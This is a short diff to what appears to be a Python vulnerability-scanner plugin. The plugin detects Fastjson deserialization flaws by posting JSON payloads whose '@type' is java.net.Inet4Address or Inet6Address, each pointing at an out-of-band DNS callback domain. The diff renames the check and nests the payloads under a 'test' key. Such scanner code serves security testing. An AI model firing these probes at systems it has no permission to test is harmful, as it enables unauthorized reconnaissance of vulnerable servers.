@@ -18,7 +18,7 @@ from script import Script
 class POC(Script):
     def __init__(self, target=None):
         self.service_type = SERVICE_PORT_MAP.WEB
-        self.name = 'fastjson 1267'
+        self.name = 'fastjson info'
         self.keyword = ['fastjson', 'info']
         self.info = 'fastjson 1267 info'
         self.type = VUL_TYPE.INFO
@@ -29,15 +29,16 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            dns = self.ceye_dns_api(k='fj1267', t='dns')
+            dns = self.ceye_dns_api(k='fjinfo', t='dns')
             # logger.sysinfo(dns + ' ------- '+  self.base_url)
             async with ClientSession() as session:
                 pocs = [
-                    {"@type": "java.net.Inet4Address", "val": dns},
-                    {"@type": "java.net.Inet6Address", "val": dns},
+                    {"test": {"@type": "java.net.Inet4Address", "val": dns}},
+                    {"test": {"@type": "java.net.Inet6Address", "val": dns}},
                 ]
                 for poc in pocs:
                     path_list = list(set([
+                        self.url,
                         self.url_normpath(self.base_url, '/'),
                         self.url_normpath(self.url, './'),
                     ]))
